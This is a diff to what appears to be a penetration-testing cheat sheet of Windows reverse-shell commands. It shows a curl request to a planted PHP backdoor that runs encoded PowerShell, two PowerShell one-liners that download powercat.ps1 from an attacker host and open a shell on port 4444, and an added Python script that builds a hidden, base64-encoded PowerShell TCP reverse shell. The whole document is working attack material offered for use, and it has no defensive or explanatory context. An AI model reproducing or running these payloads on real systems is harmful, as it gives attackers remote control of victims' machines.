@@ -12,3 +12,14 @@ curl http://10.0.0.1/xpto/uploads/backdoor.phP?cmd=powershell%20-enc%20a6666669j
 # runs remotely /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243:8000/powercat.ps1'); powercat -c 192.168.45.243 -p 4444 -e powershell"
 IEX (New-Object System.Net.Webclient).DownloadString("http://10.0.0.2/powercat.ps1");powercat -c 10.0.0.1 -p 4444 -e powershell
+
+
+
+# Base64 encoded payload
+======================================
+import sys
+import base64
+payload = '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.9",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+======================================
